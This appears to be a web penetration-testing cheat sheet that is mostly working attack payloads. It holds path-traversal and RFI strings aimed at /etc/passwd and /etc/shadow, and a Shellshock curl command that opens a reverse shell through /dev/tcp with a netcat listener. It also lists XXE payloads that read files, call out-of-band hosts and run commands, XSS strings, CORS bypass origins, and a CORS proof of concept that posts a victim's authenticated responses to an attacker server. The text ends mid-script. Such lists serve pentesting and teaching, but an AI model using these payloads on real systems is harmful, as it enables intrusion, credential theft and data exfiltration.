/etc/shadow%00
/etc/hosts
/etc/hosts%00
/boot.ini
/boot.ini%00
C:\boot.ini
C:\boot.ini%00
https://example.com/.testing/rfi_vuln.php
https://example.com/.testing/rfi_vuln.php%00
//example.com/.testing/rfi_vuln.php
//example.com/.testing/rfi_vuln.php%00
http://example.com/.testing/rfi_vuln.php
http://example.com/.testing/rfi_vuln.php%00
/../../../../../../../../../../../../../../../../../../etc/passwd
/../../../../../../../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../../../../../../../etc/hosts
/../../../../../../../../../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../../../../../../../etc/hosts%00
/../../../../../../../../../../../../../../../../../../boot.ini
/../../../../../../../../../../../../../../../../../../boot.ini%00
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\shadow
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\hosts
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\hosts%00
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow%00
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts%00
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
/..........................................................................\..\..\..\..\..\..\..\boot.ini
/..........................................................................\..\..\..\..\..\..\..\etc/passwd
/..........................................................................\..\..\..\..\..\..\..\boot.ini%00
/..........................................................................\..\..\..\..\..\..\..\etc/passwd%00
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/passwd
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/passwd%00
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/shadow%00
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/hosts
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc/hosts%00
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shadow
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/hosts
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/boot.ini
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd%00
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shadow%00
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/hosts%00
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/boot.ini%00
/
/../
/../../
/../../../
/../../../../
/../../../../../
/../../../../../../
/../../../../../../../
/../../../../../../../../
/../../../../../../../../../
/../../../../../../../../../../
/../../../../../../../../../../../
/../../../../../../../../../../../../
/../../../../../../../../../../../../../
\
\..\
\..\..\
\..\..\..\
\..\..\..\..\
\..\..\..\..\..\
\..\..\..\..\..\..\
\..\..\..\..\..\..\..\
\..\..\..\..\..\..\..\..\
\..\..\..\..\..\..\..\..\..\
\..\..\..\..\..\..\..\..\..\..\
\..\..\..\..\..\..\..\..\..\..\..\
\..\..\..\..\..\..\..\..\..\..\..\..\
\..\..\..\..\..\..\..\..\..\..\..\..\..\
-----------

-----------Shellshock - cgi-bin
curl -i -s -k  -X 'GET'     -H 'Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1' -H 'User-Agent: () { ignored; }; /bin/cat /etc/fstab;'     'http://X.X.X.X:8080/cgi-bin/index.cgi' | grep -i "200 OK" -A 10
# -
INVERSER CONNECTION - SEND:
curl -i -s -k  -X 'GET'     -H 'Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1' -H 'User-Agent: () { ignored; }; /bin/sh -i >& /dev/tcp/Y.Y.Y.Y/443 0>&1;'     'http://X.X.X.X:8080/cgi-bin/index.cgi' | grep -i "200 OK" -A 10
# -
INVERSER CONNECTION - RECIEVE:
nc.traditional -lp 443 -vvv
-----------

-----------PHP serialization - (CTF)
O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}					--> object 
a:1:{i:1;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}			--> array of objects
-----------

-----------CTF Resources
# https://github.com/apsdehal/awesome-ctf
-----------

-----------PHP serialization - RCE
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization
# https://www.notsosecure.com/remote-code-execution-via-php-unserialize/
We can use magic functions from PHP like __destruct() to alterate the flow of the application execution our own commands (to upload a shell for example)
-----------

-----------More serialization info - JSON, .NET, etc...
# https://www.youtube.com/watch?v=oUAeWhW5b8c
# https://www.youtube.com/watch?v=eDfGpu3iE4Q
-----------

-----------Java serialization
# https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/
# https://github.com/mbechler/marshalsec
-----------

-----------Phar serialization
https://www.hackplayers.com/2018/08/deserializacion-de-phar-nueva-tecnica.html
-----------

-----------XXE check if the parser is vulnerable
# https://blog.netspi.com/playing-content-type-xxe-json-endpoints/
# https://www.tinfoilsecurity.com/blog/xml-external-entity-processing
# https://blog.bugcrowd.com/advice-from-a-researcher-xxe/
# http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injections
# https://gist.github.com/staaldraad/01415b990939494879b4
# https://phonexicum.github.io/infosec/xxe.html
Content-Type: application/xml or text/xml
# -
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY hax SYSTEM "88.2.XXX.XXX:5555">]><test><testing>&hax;</testing></test>
# https://hackerone.com/reports/248668
# -
<?xml version="1.0"?>
<!DOCTYPE xee [
  <!ENTITY ext SYSTEM "80.99.xx.xx:5555">
  <!ENTITY int "product_discovery">]>
<name>∫</name>   
# Server: nc -lvvp 5555
-----------

-----------XXE another version (working)
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
%asd;
%rrr;]>
<login><username>demo@informatica.com</username><password>Infa123</password></login>
# -
# Where xx.html:
<!ENTITY % c "<!ENTITY % rrr SYSTEM 'ftp://mysite/%b;'>">%c;
-----------

-----------XXE to RCE
# https://www.securai.de/veroeffentlichungen/blog/xxe-angriff-ueber-ein-serialisierungsformat/
# https://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf
### Version 1 with expect:
<?xml version="1.0"?>
<!DOCTYPE bookstore [
	<!ENTITY xxe SYSTEM "expect://id">
]>
<bookstore>
   <book>
      <title lang="en">Origin</title>
      <author>Dan Brown</author>
      <year>2017</year>
   </book>
	<book>
      <title lang="de">Der Fremde</title>
      <author>Albert Camus</author>
      <year>&xxe;</year>
   </book>
</bookstore>

### Version 2 with php filter:
<?xml version="1.0"?>
<!DOCTYPE bookstore [
	<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<bookstore>
   <book>
      <title lang="en">Origin</title>
      <author>Dan Brown</author>
      <year>2017</year>
   </book>
   <book>
      <title lang="de">Der Fremde</title>
      <author>Albert Camus</author>
      <year>&xxe;</year>
   </book>
</bookstore>
-----------

-----------XXE identification/mitigation
# http://resources.infosecinstitute.com/identify-mitigate-xxe-vulnerabilities/
-----------

-----------From blind XXE to file access through internal proxy
# https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/
-----------

-----------XXE document generator - oxml_xxe
# https://github.com/BuffaloWill/oxml_xxe
apt-get install libsqlite3-dev libxslt-dev libxml2-dev zlib1g-dev gcc
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
\curl -sSL https://get.rvm.io | bash
source /usr/local/rvm/scripts/rvm
rvm autolibs disable
rvm install 2.3.5
rvm use 2.3.5
git clone https://github.com/BuffaloWill/oxml_xxe
cd oxml_xxe
gem install bundler
bundle install
ruby server.rb
-----------

-----------XXE reusable DTD files
# https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation
### Payloads:
# https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md
### DTD files list:
# https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt
./properties/schemas/j2ee/XMLSchema.dtd
./../properties/schemas/j2ee/XMLSchema.dtd
./../../properties/schemas/j2ee/XMLSchema.dtd
/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/maven-repo/javax/servlet/jsp/jsp-api/2.0/jsp-api-2.0.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/maven-repo/javax/servlet/jsp/jsp-api/2.1/jsp-api-2.1.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/maven-repo/javax/servlet/jsp/jsp-api/2.1.1/jsp-api-2.1.1.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/maven-repo/javax/servlet/jsp/jsp-api/2.1.2/jsp-api-2.1.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/maven-repo/javax/servlet/jsp/jsp-api/2.2/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd
/u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss-client_4_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss-client_4_2.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss-client_5_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss-web_4_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss-web_4_2.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss-web_5_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss_4_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss_4_2.dtd
/opt/jboss-5.1.0.GA/docs/dtd/jboss_5_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/web-facesconfig_1_0.dtd
/opt/jboss-5.1.0.GA/docs/dtd/web-facesconfig_1_1.dtd
/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd
/opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd
/opt/jboss/wildfly/modules/system/layers/base/org/jboss/security/xacml/main/jbossxacml-2.0.8.Final.jar!/schema/xmlschema/XMLSchema.dtd
/opt/jboss/wildfly/modules/system/layers/base/org/picketlink/federation/main/picketlink-federation-2.5.5.SP12.jar!/schema/w3c/xmlschema/XMLSchema.dtd
/opt/anaconda2/share/xml/fontconfig/fonts.dtd
/opt/anaconda2/pkgs/fontconfig-2.11.1-5/share/xml/fontconfig/fonts.dtd
/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
/usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd
/usr/lib/gap/pkg/GAPDoc-1.6.2/gapdoc.dtd
/usr/lib/libreoffice/share/dtd/officedocument/1_0/libraries.dtd
/usr/lib/libreoffice/share/dtd/officedocument/1_0/office.dtd
/usr/lib/libreoffice/share/dtd/officedocument/1_0/toolbar.dtd
/usr/lib/libreoffice/share/dtd/officedocument/1_0/dialog.dtd
/usr/lib/vmware/libconf/etc/fonts/fonts.dtd
/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
/usr/share/boostbook/dtd/1.1/boostbook.dtd
/usr/share/boostbook/dtd/boostbook.dtd
/usr/share/dblatex/schema/dblatex-config.dtd
/usr/share/doc/python-docutils-0.12/docs/ref/docutils.dtd
/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
/usr/share/gtksourceview-2.0/language-specs/language.dtd
/usr/share/gtksourceview-3.0/language-specs/language.dtd
/usr/share/gtksourceview-4/language-specs/language.dtd
/usr/share/libgda-5.0/dtd/libgda-paramlist.dtd
/usr/share/libgda-5.0/dtd/libgda-server-operation.dtd
/usr/share/libgweather/locations.dtd
/usr/share/liteide/liteeditor/kate/language.dtd
/usr/share/lv2specgen/DTD/xhtml-basic11.dtd
/usr/share/nmap/nmap.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/docutils/docutils.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/struts/struts-config_1_0.dtd
/usr/share/struts/struts-config_1_1.dtd
/usr/share/struts/struts-config_1_2.dtd
/usr/share/struts/struts-config_1_3.dtd
/usr/share/struts/struts-config_1_4.dtd
-----------

-----------XML - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xml-attacks.txt
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"> ]>
<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "http://crowdshield.com/.testing/rfi_vuln.txt"> ]>
<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>
<?xml version="1.0"?><change-log><text>Hello World</text></change-log>
<?xml version="1.0"?><change-log><text>&quot;Hello World&quot;</text></change-log>
<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"> ]><change-log><text>Hello &myEntity;</text></change-log>
<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"><!ENTITY myQuote "&quot;"> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>
<!ENTITY systemEntity SYSTEM "robots.txt">
<change-log> <text>&systemEntity;</text> </change-log>
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text> </change-log>
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../../boot.ini"> ]> <change-log> <text>&systemEntity;</text> </change-log>
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text>; </change-log>
<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>
<?xml version="1.0"?><change-log><text><script>alert(1)</script></text></change-log>
count(/child::node())
x' or name()='username' or 'x'='y
<name>','')); phpinfo(); exit;/*</name>
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>"
<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
<xml SRC="https://crowdshield.com/.testing/rfi_vuln.txt" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
<HTML xmlns:xss><?import namespace="xss" implementation="https://crowdshield.com/.testing/xss.html"><xss:xss>XSS</xss:xss></HTML>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="https://crowdshield.com/.testing/xss.html" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">%f5a30; ]>
‘
“
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../boot.ini" ]> <change-log> <text>&systemEntity;</text>; </change-log>
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini" >]><doc><test>Contents of file: &xxe;</test></doc>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> 
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> 
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi.txt" >]><foo>&xxe;</foo>
"}}</script><script>alert(1);</script></body></html><!-- 
}}</script>'"
}}</script>'
'}}</script>'
'}}</script>"
<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>
<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "../../../../../../../etc/passwd">]><methodCall><methodName>&xxe</methodName></methodCall>
<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php" >]><doc><test>Contents of file: &xxe;</test></doc>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
}}</script><script>alert(1);</script></body></html><!-- 
"}}</script>'
}}</script>""'"
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
-----------

-----------Cross Origin Resource Sharing (CORS) - Theory
No Access-Control-Allow-Origin header no access
Access-Control-Allow-Origin: *					--> access by everyone		(browsers block it with the Allow-Credentials: true)
Access-Control-Allow-Origin: *.domain.com		--> accessible by all the subdomains
Access-Control-Allow-Origin: static.com			--> just accessible by this domain hardcoded
Access-Control-Allow-Origin: dynamic.com		--> it can be dynamic
Access-Control-Allow-Origin: null				--> vulnerable
Access-Control-Allow-Credentials: true			--> it passes the credentials from the user to log in (cookies)
Vary: Origin									--> Declare that the Origin varies so you don't use the one in the cache (?)
If a website has ACAO * I can injectn XSS to access to their resources in any page.
If a website has ACAO static.com I need an XSS in the static.com page to access to their resources.
-----------

-----------HTML5 Cross Origin Resource Sharing (CORS) - steal CSRF
# http://yassineaboukir.com/blog/security-impact-of-a-misconfigured-cors-implementation/	
# https://insinuator.net/2013/08/some-security-impacts-of-html5-cors-or-how-to-use-a-browser-as-a-proxy/
Firebug: console -> localStorage
-----------

-----------CORS PHP
<?php header('Access-Control-Allow-Origin: *'); ?>
-----------

-----------CORS ACAO:null misconfiguration
# https://youtu.be/wgkj4ZgxI4c?t=17m8s
# https://portswigger.net/knowledgebase/papers/ExploitingCORSMisconfigurations.pdf
<iframe sandbox='allow-scripts allow-forms' 
src='
data:text/html, <!DOCTYPE html>
<script>
var req= new XMLHttpRequest(); 
</script>
'>
</iframe>
-----------

-----------Bypass Dynamic CORS
# Left parser
Origin: http://website.com.evil.net
# Right parser
Origin: http://cors.io/?http://website.com
Origin: http://cors.io/#http://website.com
Origin: http://zzzwebsite.com
-----------

-----------Bypass Dynamic CORS with MITM attack
# https://youtu.be/wgkj4ZgxI4c?t=24m2s
# https://portswigger.net/knowledgebase/papers/ExploitingCORSMisconfigurations.pdf
# Usually they have a whitelist for subdomains
# MITM to spoof DNS to:
Origin: http://evil.google.com
# And get:
ACAO: http://evil.google.com
ACAC: true
-----------

-----------CORS Cache Poisoning with ACAO:* (and XSS)
# https://youtu.be/wgkj4ZgxI4c?t=30m30s
-----------

-----------CORS with ACAC:false
# https://youtu.be/wgkj4ZgxI4c?t=27m55s
# Still usefull to send trafic throught the clien and bypass IP whitelists.
-----------

-----------CORS PoC
# https://github.com/trustedsec/cors-poc
### postlogger.py:
#!/usr/bin/env python3
import cgi
import sys
import urllib.parse
#Read the POST request body submitted from corstest.html
postform = cgi.FieldStorage()
postdata = urllib.parse.unquote(postform['responsehtml'].value).replace('\\r\\n', '\r\n').replace('\\t', '\t')
sys.stderr.write(postdata)
#Write the POST data to disk
with open('captured-post-data.txt', 'a+') as outputfile:
    outputfile.writelines(postdata)

### corstest.html:
<html>
	<head>
		<title>CORS POC</title>
	</head>
	<body>
		<h1>CORS POC</h>
		<script>
			var crossoriginget = new XMLHttpRequest();
			//The target site with the bad CORS configuration
            var url = 'https://site-to-attack.com/xxxxx/yyyyy';
			crossoriginget.open('GET', url, true);
			/*  This tells the browser to send the request with cookies;
			    requires “Access-Control-Allow-Credentials = true” in
			    response headers for this.responseText to be readable.  */
			crossoriginget.withCredentials = true;
			crossoriginget.onload = reqListener;
			crossoriginget.send();
			/*  Once the cross-origin request completes, attempt to read the
			    response text and send it to the malicious server using an
			    HTTP POST request.  */
			function reqListener() {
				var exfiltraterequest = new XMLHttpRequest();
				//Our server hosting the CORS attack
				var maliciousurl = 'http://192.168.40.1:8000/cgi-bin/postlogger.py';
				exfiltraterequest.open('POST', maliciousurl);
				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
				alert(this.responseText);
			};
		</script>
	</body>
</html>

### Run it: 
python3 -m http.server --cgi
-----------

-----------XMLHttpRequest to get the response (bypassing HTTPONLY and CSRF) - XSS
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open('GET', 'https://xxxxxxx.com/attachments/token/aaaa', true);
xhr.setRequestHeader("Accept", 'text/html');
